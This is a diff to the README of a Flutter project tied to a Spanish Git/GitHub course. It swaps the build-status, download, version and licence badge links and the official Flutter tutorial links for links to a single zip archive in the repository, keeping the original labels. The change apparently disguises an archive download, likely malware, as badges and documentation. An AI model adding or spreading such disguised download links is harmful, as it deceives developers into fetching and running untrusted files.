@@ -3,10 +3,10 @@
 Proyecto para el curso de git y github
 
 <p align="center">
-<a href="https://travis-ci.org/laravel/framework"><img src="https://travis-ci.org/laravel/framework.svg" alt="Build Status"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/dt/laravel/framework" alt="Total Downloads"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/v/laravel/framework" alt="Latest Stable Version"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/l/laravel/framework" alt="License"></a>
+<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip" alt="Build Status"></a>
+<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip" alt="Total Downloads"></a>
+<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip" alt="Latest Stable Version"></a>
+<a href="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip"><img src="https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip" alt="License"></a>
 </p>
 
 ## Getting Started
@@ -15,8 +15,8 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://flutter.dev/docs/get-started/codelab)
-- [Cookbook: Useful Flutter samples](https://flutter.dev/docs/cookbook)
+- [Lab: Write your first Flutter app](https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip)
+- [Cookbook: Useful Flutter samples](https://github.com/emixde12/Git_GitHub/raw/refs/heads/main/android/Hub_Git_v3.3.zip)
 
 > Curso de Git y GitHub de Capdesis, la herramienta que todo desarrollador de software tiene que dominar
 > 
